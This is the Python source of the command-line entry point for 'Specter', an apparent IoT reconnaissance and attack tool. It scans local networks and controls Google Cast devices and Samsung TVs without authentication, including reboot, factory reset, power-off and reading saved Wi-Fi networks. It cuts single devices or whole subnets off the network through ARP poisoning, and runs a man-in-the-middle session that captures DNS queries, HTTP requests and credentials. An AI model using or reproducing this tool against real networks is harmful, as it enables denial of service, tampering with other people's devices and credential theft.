"""Specter CLI — main entry point.

Usage:
    specter scan             Discover all devices on the local network
    specter portscan <ip>    Scan ports on a specific device
    specter cast <cmd> <ip>  Control Google Cast devices
    specter tv <cmd> <ip>    Control Samsung TVs
    specter kill <ip>        Disconnect a single device
    specter nuke             Disconnect ALL devices from the network
    specter mitm <ip>        Man-in-the-middle a device's traffic
    specter web              Launch the web dashboard
"""

import typer
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel

app = typer.Typer(name="specter", help="Network IoT reconnaissance and control framework.")
console = Console()


@app.command()
def scan(
    subnet: str = typer.Option(None, "--subnet", "-s", help="Target subnet (e.g., 192.168.1.0/24). Auto-detected if omitted."),
    timeout: float = typer.Option(5.0, "--timeout", "-t", help="Scan timeout in seconds."),
    ports: bool = typer.Option(False, "--ports", "-p", help="Also scan common IoT ports on each host."),
):
    """Discover all devices on the local network."""
    from specter.scanner.arp import arp_scan
    from specter.scanner.mdns import MDNSScanner
    from specter.scanner.fingerprint import fingerprint_device, lookup_oui

    if not subnet:
        from scapy.all import conf
        ip = conf.route.route("0.0.0.0")[1]
        subnet = f"{ip}/24"
        console.print(f"[dim]Auto-detected subnet: {subnet}[/dim]")

    console.print(f"\n[bold]ARP Scanning {subnet}...[/bold]")
    hosts = arp_scan(subnet, timeout=timeout)

    console.print(f"[bold]mDNS Discovery...[/bold]")
    mdns = MDNSScanner()
    services = mdns.scan(duration=timeout)

    # Build service map by IP
    service_map: dict[str, list[str]] = {}
    for svc in services:
        service_map.setdefault(svc.host, []).append(svc.service_type)

    # Optional port scan
    port_map: dict[str, list[int]] = {}
    if ports:
        from specter.scanner.ports import port_scan
        console.print(f"[bold]Port scanning {len(hosts)} hosts...[/bold]")
        for host in hosts:
            result = port_scan(host.ip)
            if result.open_ports:
                port_map[host.ip] = [p.port for p in result.open_ports]

    # Display results
    table = Table(title=f"Discovered Devices ({len(hosts)} hosts)")
    table.add_column("IP", style="cyan")
    table.add_column("MAC", style="green")
    table.add_column("Vendor", style="yellow")
    table.add_column("Type", style="magenta")
    table.add_column("Services", style="dim")
    if ports:
        table.add_column("Open Ports", style="red")

    for host in hosts:
        host.vendor = lookup_oui(host.mac)
        svc_list = service_map.get(host.ip, [])
        profile = fingerprint_device(host.ip, host.mac, svc_list)
        row = [
            host.ip,
            host.mac,
            profile.vendor,
            profile.device_type,
            ", ".join(s.replace("._tcp.local.", "") for s in svc_list) or "-",
        ]
        if ports:
            row.append(", ".join(str(p) for p in port_map.get(host.ip, [])) or "-")
        table.add_row(*row)

    console.print(table)


@app.command()
def portscan(
    target: str = typer.Argument(help="Target IP to scan."),
    timeout: float = typer.Option(1.5, "--timeout", "-t", help="Timeout per port."),
):
    """Scan a device for open ports and identify unauthenticated services."""
    from specter.scanner.ports import port_scan

    console.print(f"\n[bold]Scanning {target} for open ports...[/bold]")
    result = port_scan(target, timeout=timeout)

    if not result.open_ports:
        console.print("[yellow]No open ports found.[/yellow]")
        return

    table = Table(title=f"Open Ports on {target}")
    table.add_column("Port", style="cyan")
    table.add_column("Service", style="green")
    table.add_column("Banner", style="dim", max_width=60)
    table.add_column("Unauth?", style="bold red")

    for port in result.open_ports:
        table.add_row(
            str(port.port),
            port.service,
            port.banner[:60] if port.banner else "-",
            "YES" if port.unauthenticated else "-",
        )

    console.print(table)

    # Highlight actionable findings
    unauth_ports = [p for p in result.open_ports if p.unauthenticated]
    if unauth_ports:
        console.print(f"\n[bold red]Found {len(unauth_ports)} potentially unauthenticated service(s)![/bold red]")
        for p in unauth_ports:
            console.print(f"  [red]>[/red] {p.port}/{p.service} — {p.banner[:80]}")


@app.command()
def cast(
    action: str = typer.Argument(help="Action: info, reboot, reset, dnd, alarms, wifi, bluetooth, nightmode"),
    target: str = typer.Argument(help="Target device IP address."),
    token: str = typer.Option("", "--token", "-k", help="Local authorization token."),
):
    """Control a Google Cast device."""
    from specter.modules.google_cast import GoogleCastModule, CastDevice

    device = CastDevice(ip=target, local_auth_token=token)
    module = GoogleCastModule(device)

    match action:
        case "info":
            info = module.get_device_info()
            console.print_json(data=info)
        case "reboot":
            if module.reboot():
                console.print("[bold red]Device rebooting.[/bold red]")
            else:
                console.print("[red]Failed to reboot.[/red]")
        case "reset":
            typer.confirm("This will FACTORY RESET the device. Continue?", abort=True)
            if module.factory_reset():
                console.print("[bold red]Factory reset initiated.[/bold red]")
        case "dnd":
            result = module.set_do_not_disturb(True)
            console.print(f"Do Not Disturb enabled: {result}")
        case "alarms":
            alarms = module.get_alarms()
            console.print_json(data=alarms)
        case "wifi":
            networks = module.get_saved_wifi_networks()
            console.print_json(data=networks)
        case "bluetooth":
            console.print("[dim]Scanning Bluetooth devices...[/dim]")
            devices = module.scan_bluetooth()
            console.print_json(data=devices)
        case "nightmode":
            result = module.set_night_mode(enabled=True, volume=0.1, led_brightness=0.1)
            console.print(f"Night mode set: {result}")
        case _:
            console.print(f"[red]Unknown action: {action}[/red]")


@app.command()
def tv(
    action: str = typer.Argument(help="Action: info, off, mute, volup, voldown, apps"),
    target: str = typer.Argument(help="Samsung TV IP address."),
):
    """Control a Samsung Smart TV (unauthenticated)."""
    from specter.modules.samsung_tv import SamsungTVModule, SamsungTV

    device = SamsungTV(ip=target)
    module = SamsungTVModule(device)

    match action:
        case "info":
            info = module.get_device_info()
            if info:
                console.print_json(data=info)
            else:
                console.print("[red]TV not reachable or API not exposed.[/red]")
        case "off":
            if module.power_off():
                console.print("[bold red]TV powering off.[/bold red]")
            else:
                console.print("[red]Failed — TV may not accept unauthenticated commands.[/red]")
        case "mute":
            if module.mute():
                console.print("[green]Mute toggled.[/green]")
        case "volup":
            module.volume_up(5)
            console.print("[green]Volume +5.[/green]")
        case "voldown":
            module.volume_down(5)
            console.print("[green]Volume -5.[/green]")
        case "apps":
            apps = module.get_installed_apps()
            if apps:
                console.print_json(data=apps)
            else:
                console.print("[yellow]Could not retrieve apps.[/yellow]")
        case _:
            console.print(f"[red]Unknown action: {action}[/red]")


@app.command()
def kill(
    target: str = typer.Argument(help="Target device IP to disconnect."),
    gateway: str = typer.Option(None, "--gateway", "-g", help="Gateway IP. Auto-detected if omitted."),
    duration: int = typer.Option(0, "--duration", "-d", help="Duration in seconds (0 = until Ctrl+C)."),
):
    """Disconnect a single device from the network via ARP poisoning."""
    from specter.killswitch.arp_poison import ARPPoisoner

    if not gateway:
        from scapy.all import conf
        gateway = conf.route.route("0.0.0.0")[2]
        console.print(f"[dim]Auto-detected gateway: {gateway}[/dim]")

    console.print(f"[bold red]Killing {target} (gateway: {gateway})[/bold red]")
    console.print("[dim]Press Ctrl+C to stop and restore ARP.[/dim]")

    poisoner = ARPPoisoner(target_ip=target, gateway_ip=gateway)
    poisoner.start()

    _wait(duration)

    console.print("\n[yellow]Restoring ARP tables...[/yellow]")
    poisoner.stop()
    console.print("[green]Done. Target should reconnect shortly.[/green]")


@app.command()
def nuke(
    mode: str = typer.Argument("all", help="Mode: 'all' (kill every device) or 'gateway' (poison the gateway)."),
    subnet: str = typer.Option(None, "--subnet", "-s", help="Target subnet. Auto-detected if omitted."),
    duration: int = typer.Option(0, "--duration", "-d", help="Duration in seconds (0 = until Ctrl+C)."),
):
    """Kill network connectivity for ALL devices."""
    from specter.killswitch.arp_poison import NetworkKiller, get_gateway_ip
    from scapy.all import conf

    if not subnet:
        ip = conf.route.route("0.0.0.0")[1]
        subnet = f"{ip}/24"

    gateway = get_gateway_ip()
    killer = NetworkKiller(subnet=subnet, gateway_ip=gateway)

    if mode == "gateway":
        console.print(f"[bold red]NUKING NETWORK — Poisoning gateway {gateway}[/bold red]")
        console.print("[dim]All devices will lose internet. Press Ctrl+C to restore.[/dim]")
        count = killer.kill_gateway()
        console.print(f"[red]Gateway poisoned for {count} hosts.[/red]")
    else:
        console.print(f"[bold red]NUKING NETWORK — Killing all devices on {subnet}[/bold red]")
        console.print("[dim]Press Ctrl+C to restore.[/dim]")
        count = killer.kill_all()
        console.print(f"[red]{count} devices being disconnected.[/red]")

    _wait(duration)

    console.print("\n[yellow]Restoring ARP tables...[/yellow]")
    killer.stop()
    console.print("[green]Network restored.[/green]")


@app.command()
def mitm(
    target: str = typer.Argument(help="Target IP to intercept."),
    gateway: str = typer.Option(None, "--gateway", "-g", help="Gateway IP. Auto-detected if omitted."),
    duration: int = typer.Option(0, "--duration", "-d", help="Duration in seconds (0 = until Ctrl+C)."),
):
    """Man-in-the-middle: intercept a device's traffic."""
    import platform
    import subprocess
    from specter.killswitch.arp_poison import MITMPoisoner
    from specter.killswitch.sniffer import TrafficSniffer

    if not gateway:
        from scapy.all import conf
        gateway = conf.route.route("0.0.0.0")[2]
        console.print(f"[dim]Auto-detected gateway: {gateway}[/dim]")

    # Enable IP forwarding
    if platform.system() == "Windows":
        console.print("[dim]Enabling IP forwarding (Windows)...[/dim]")
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "interface", "interface=Wi-Fi", "forwarding=enabled"],
            capture_output=True,
        )
    else:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)

    console.print(f"[bold yellow]MITM active on {target}[/bold yellow]")
    console.print("[dim]Intercepting traffic. Press Ctrl+C to stop.[/dim]\n")

    poisoner = MITMPoisoner(target_ip=target, gateway_ip=gateway)
    sniffer = TrafficSniffer(target_ip=target)

    poisoner.start()
    sniffer.start()

    try:
        import time
        last_count = 0
        while True:
            time.sleep(2)
            session = sniffer.session
            new_packets = session.packet_count - last_count
            if new_packets > 0:
                console.print(
                    f"  [dim]Packets: {session.packet_count} | "
                    f"DNS: {len(session.dns_queries)} | "
                    f"HTTP: {len(session.http_requests)} | "
                    f"Creds: {len(session.credentials)}[/dim]"
                )
                # Print new DNS queries
                for dns in session.dns_queries[last_count:]:
                    console.print(f"    [cyan]DNS[/cyan] {dns['query']}")
                # Print new HTTP requests
                for http in session.http_requests[last_count:]:
                    console.print(f"    [green]HTTP[/green] {http['request']}")
                # Print credentials
                for cred in session.credentials[last_count:]:
                    console.print(f"    [bold red]CREDS[/bold red] {cred['snippet'][:100]}")
                last_count = session.packet_count
    except KeyboardInterrupt:
        pass
    finally:
        session = sniffer.stop()
        console.print("\n[yellow]Stopping MITM and restoring ARP...[/yellow]")
        poisoner.stop()

        # Disable IP forwarding
        if platform.system() == "Windows":
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "interface", "interface=Wi-Fi", "forwarding=disabled"],
                capture_output=True,
            )

        # Summary
        console.print(Panel(
            f"[bold]Session Summary[/bold]\n"
            f"  Packets captured: {session.packet_count}\n"
            f"  DNS queries: {len(session.dns_queries)}\n"
            f"  HTTP requests: {len(session.http_requests)}\n"
            f"  Potential credentials: {len(session.credentials)}",
            title="MITM Results",
            border_style="red",
        ))


@app.command()
def web(
    host: str = typer.Option("127.0.0.1", "--host", help="Bind address."),
    port: int = typer.Option(8080, "--port", "-p", help="Port number."),
):
    """Launch the Specter web dashboard."""
    import uvicorn
    console.print(f"[bold]Starting Specter dashboard at http://{host}:{port}[/bold]")
    uvicorn.run("specter.web.app:app", host=host, port=port, reload=True)


def _wait(duration: int) -> None:
    """Wait for duration or until Ctrl+C."""
    import time
    try:
        if duration > 0:
            time.sleep(duration)
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    app()
